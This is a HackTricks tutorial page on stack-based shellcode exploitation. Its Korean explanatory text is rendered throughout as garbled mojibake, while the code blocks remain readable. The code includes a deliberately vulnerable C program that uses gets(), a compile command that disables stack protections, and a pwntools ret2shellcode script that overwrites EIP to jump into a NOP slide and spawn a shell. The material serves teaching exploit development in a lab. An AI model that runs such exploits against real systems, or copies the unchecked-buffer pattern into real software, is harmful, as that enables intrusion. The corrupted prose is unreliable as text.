# ìŠ¤íƒ ì‰˜ì½”ë“œ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

**ìŠ¤íƒ ì‰˜ì½”ë“œ**ëŠ” **ë°”ì´ë„ˆë¦¬ ìµìŠ¤í”Œë¡œì‡**ì—ì„œ ì‚¬ìš©ë˜ëŠ” ê¸°ìˆ ë¡œ, ê³µê²©ìê°€ ì·¨ì•½í•œ í”„ë¡œê·¸ë¨ì˜ ìŠ¤íƒì— ì‰˜ì½”ë“œë¥¼ ì‘ì„±í•˜ê³  **ëª…ë ¹ì–´ í¬ì¸í„° (IP)** ë˜ëŠ” **í™•ì¥ëœ ëª…ë ¹ì–´ í¬ì¸í„° (EIP)**ë¥¼ ì´ ì‰˜ì½”ë“œì˜ ìœ„ì¹˜ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ìˆ˜ì •í•˜ì—¬ ì‹¤í–‰ì‹œí‚¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ë¥¼ ì–»ê±°ë‚˜ ëŒ€ìƒ ì‹œìŠ¤í…œì—ì„œ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ê³ ì „ì ì¸ ë°©ë²•ì…ë‹ˆë‹¤. ì—¬ê¸°ì—ëŠ” ê°„ë‹¨í•œ C ì˜ˆì œì™€ **pwntools**ë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ ì·¨ì•½ì ì„ ì´ìš©í•˜ëŠ” ë°©ë²•ì„ ì‘ì„±í•˜ëŠ” ë°©ë²•ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

### C ì˜ˆì œ: ì·¨ì•½í•œ í”„ë¡œê·¸ë¨

ê°„ë‹¨í•œ ì·¨ì•½í•œ C í”„ë¡œê·¸ë¨ ì˜ˆì œë¶€í„° ì‹œì‘í•´ë³´ê² ìŠµë‹ˆë‹¤:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
ì´ í”„ë¡œê·¸ë¨ì€ `gets()` í•¨ìˆ˜ ì‚¬ìš©ìœ¼ë¡œ ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤.

### ì»´íŒŒì¼

ì·¨ì•½í•œ í™˜ê²½ì„ ì‹œë®¬ë ˆì´ì…˜í•˜ê¸° ìœ„í•´ ë‹¤ì–‘í•œ ë³´í˜¸ ê¸°ëŠ¥ì„ ë¹„í™œì„±í™”í•˜ë©´ì„œ ì´ í”„ë¡œê·¸ë¨ì„ ì»´íŒŒì¼í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: ìŠ¤íƒ ë³´í˜¸ ê¸°ëŠ¥ì„ ë¹„í™œì„±í™”í•©ë‹ˆë‹¤.
* `-z execstack`: ìŠ¤íƒì„ ì‹¤í–‰ ê°€ëŠ¥í•˜ê²Œ ë§Œë“¤ì–´ì¤ë‹ˆë‹¤. ì´ëŠ” ìŠ¤íƒì— ì €ì¥ëœ ì…¸ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë° í•„ìš”í•©ë‹ˆë‹¤.
* `-no-pie`: ìœ„ì¹˜ ë…ë¦½ ì‹¤í–‰ íŒŒì¼ì„ ë¹„í™œì„±í™”í•˜ì—¬ ì…¸ì½”ë“œê°€ ìœ„ì¹˜í•  ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ì˜ˆì¸¡í•˜ê¸° ì‰½ê²Œ í•©ë‹ˆë‹¤.
* `-m32`: í”„ë¡œê·¸ë¨ì„ 32ë¹„íŠ¸ ì‹¤í–‰ íŒŒì¼ë¡œ ì»´íŒŒì¼í•©ë‹ˆë‹¤. ì£¼ë¡œ exploit ê°œë°œì˜ ê°„í¸ì„±ì„ ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.

### Pwntoolsë¥¼ ì‚¬ìš©í•œ Python Exploit

ë‹¤ìŒì€ **pwntools**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ret2shellcode** ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” Python exploitì„ ì‘ì„±í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” **NOP ìŠ¬ë¼ì´ë“œ**, **ì‰˜ì½”ë“œ**, ê·¸ë¦¬ê³  **EIP**ë¥¼ NOP ìŠ¬ë¼ì´ë“œë¥¼ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œë¡œ ë®ì–´ì“°ë©´ì„œ ì‰˜ì½”ë“œê°€ ì‹¤í–‰ë˜ë„ë¡ í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•©ë‹ˆë‹¤.

**NOP ìŠ¬ë¼ì´ë“œ** (`asm('nop')`)ëŠ” ì‹¤í–‰ì´ ì •í™•í•œ ì£¼ì†Œì— ê´€ê³„ì—†ì´ ì‰˜ì½”ë“œë¡œ "ìŠ¬ë¼ì´ë”©"ë  ê°€ëŠ¥ì„±ì„ ë†’ì´ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. `p32()` ì¸ìë¥¼ ë²„í¼ì˜ ì‹œì‘ ì£¼ì†Œì— ì˜¤í”„ì…‹ì„ ë”í•œ ê°’ìœ¼ë¡œ ì¡°ì •í•˜ì—¬ NOP ìŠ¬ë¼ì´ë“œì— ì°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë³´í˜¸ ê¸°ëŠ¥

* [**ASLR**](../../common-binary-protections-and-bypasses/aslr/)ì€ ì‹¤í–‰ë§ˆë‹¤ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì£¼ì†Œë¥¼ ìœ„í•´ **ë¹„í™œì„±í™”**ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ í•¨ìˆ˜ê°€ ì €ì¥ë  ì£¼ì†Œê°€ í•­ìƒ ë™ì¼í•˜ì§€ ì•Šì„ ìˆ˜ ìˆê³  ì´ë¥¼ ì•Œì•„ë‚´ê¸° ìœ„í•´ ìœ ì¶œì´ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**ìŠ¤íƒ ì¹´ë‚˜ë¦¬**](../../common-binary-protections-and-bypasses/stack-canaries/)ë„ ë¹„í™œì„±í™”ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ì¹¨í•´ëœ EIP ë°˜í™˜ ì£¼ì†Œê°€ ê²°ì½” ë”°ë¼ê°€ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**NX**](../../common-binary-protections-and-bypasses/no-exec-nx.md) **ìŠ¤íƒ** ë³´í˜¸ëŠ” ìŠ¤íƒ ë‚´ë¶€ì˜ ì‰˜ì½”ë“œ ì‹¤í–‰ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì˜ì—­ì€ ì‹¤í–‰í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

## ë‹¤ë¥¸ ì˜ˆì œ ë° ì°¸ê³  ìë£Œ

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
* [https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html)
* 64ë¹„íŠ¸, ìŠ¤íƒ ì£¼ì†Œ ìœ ì¶œê³¼ ASLR, ì‰˜ì½”ë“œ ì‘ì„± ë° ì‹¤í–‰
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html)
* 32ë¹„íŠ¸, ìŠ¤íƒ ìœ ì¶œê³¼ ASLR, ì‰˜ì½”ë“œ ì‘ì„± ë° ì‹¤í–‰
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html)
* 32ë¹„íŠ¸, ìŠ¤íƒ ìœ ì¶œê³¼ ASLR, exit() í˜¸ì¶œ ë°©ì§€ë¥¼ ìœ„í•œ ë¹„êµ, ë³€ìˆ˜ ë®ì–´ì“°ê¸° ë° ì‰˜ì½”ë“œ ì‘ì„± ë° ì‹¤í–‰
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, ASLR ì—†ìŒ, ìŠ¤íƒì„ ì‹¤í–‰ ê°€ëŠ¥í•˜ê²Œ ë§Œë“œëŠ” ROP ê°€ì ¯ ë° ìŠ¤íƒ ë‚´ ì‰˜ì½”ë“œë¡œ ì í”„í•˜ê¸°

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° AWS í•´í‚¹ì„ ì „ë¬¸ê°€ë¡œ ë°°ìš°ì„¸ìš”**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—™ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
